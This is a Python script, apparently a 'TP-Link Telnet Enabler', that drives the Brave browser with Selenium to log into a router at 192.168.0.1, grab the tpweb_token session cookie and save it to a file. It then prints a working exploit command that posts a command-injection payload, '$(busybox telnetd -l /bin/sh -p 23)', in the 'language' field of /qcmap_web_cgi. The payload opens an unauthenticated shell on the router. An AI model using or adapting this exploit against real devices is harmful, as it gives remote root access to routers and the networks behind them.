#!/usr/bin/env python3
"""
TP-Link Telnet Enabler (Token var.)
"""
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import json

print("="*60)
print("TP-Link Token Grabber")
print("="*60)

# Setup Brave
brave_path = "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"
options = Options()
options.binary_location = brave_path
options.add_argument("--disable-blink-features=AutomationControlled")

# Open browser
print("Opening Brave browser...")
driver = webdriver.Chrome(options=options)

# Go to router
print("Navigating to router...")
driver.get("http://192.168.0.1")

print("\n" + "="*60)
print("MANUAL LOGIN REQUIRED")
print("="*60)
print("Please:")
print("1. Login with: admin / password")
print("2. Wait for page to load")
print("3. Then come back here")
print("="*60)

input("\nPress Enter AFTER you've logged in...")

# Get cookies
print("\nChecking cookies...")
cookies = driver.get_cookies()

token = None
for cookie in cookies:
    print(f"Cookie: {cookie['name']} = {cookie['value'][:20]}...")
    if 'tpweb_token' in cookie['name'].lower():
        token = cookie['value']
        print(f"\n FOUND TOKEN: {token}")
        break

if token:
    print("\n" + "="*60)
    print("TOKEN FOUND!")
    print("="*60)
    print(f"Token: {token}")
    
    # Save to file
    with open("token.txt", "w") as f:
        f.write(token)
    print("Token saved to: token.txt")
    
    # Ask about exploit
    choice = input("\nRun exploit? (y/n): ").lower().strip()
    
    if choice == 'y':
        print("\n🚀 Running exploit...")
        
        # You can add the exploit code here or run it manually
        print("Copy this command to run exploit:")
        print(f"python -c \"import requests; r=requests.post('http://192.168.0.1/qcmap_web_cgi', "
              f"json={{'token':'{token}','module':'webServer','action':1,'language':'\\$(busybox telnetd -l /bin/sh -p 23)'}}, "
              f"headers={{'Cookie':'tpweb_token={token}'}}); print(r.status_code, r.text)\"")
        
else:
    print("\nNo token found in cookies!")
    print("Trying localStorage...")
    
    try:
        # Check localStorage
        ls = driver.execute_script("return JSON.stringify(localStorage);")
        print(f"localStorage: {ls[:200]}...")
    except:
        print("Could not access localStorage")

print("\nBrowser will stay open for 30 seconds...")
print(f"Current URL: {driver.current_url}")
print(f"Page title: {driver.title}")

time.sleep(30)
driver.quit()

print("\nDone!")